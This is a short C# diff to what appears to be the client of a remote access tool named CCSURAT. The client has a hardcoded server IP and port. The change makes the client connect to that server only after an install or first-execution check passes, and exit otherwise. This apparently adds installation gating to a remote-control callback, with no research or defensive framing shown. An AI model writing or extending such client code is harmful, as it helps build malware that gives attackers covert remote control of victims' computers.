@@ -9,6 +9,7 @@ namespace CCSURAT_Client
         // Declare server details.
         private static string serverIP = "32.212.129.249";
         private static int serverPort = 7777;
+        private static bool install = true;
 
         private NetworkManager connection;
 
@@ -19,11 +20,18 @@ namespace CCSURAT_Client
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            connection = new NetworkManager(this, serverIP, serverPort);
-            Thread networkThread = new Thread(new ThreadStart(connection.Start));
-            networkThread.SetApartmentState(ApartmentState.STA);
-            networkThread.Start();
-            this.Text = "CCSURAT-Client v" + Application.ProductVersion;
+            if (install && !SystemUtils.FirstExecution())
+            {
+                connection = new NetworkManager(this, serverIP, serverPort);
+                Thread networkThread = new Thread(new ThreadStart(connection.Start));
+                networkThread.SetApartmentState(ApartmentState.STA);
+                networkThread.Start();
+                this.Text = "CCSURAT-Client v" + Application.ProductVersion;
+            }
+            else
+            {
+                Application.Exit();
+            }
         }
 
         private void sendButton_Click(object sender, EventArgs e)
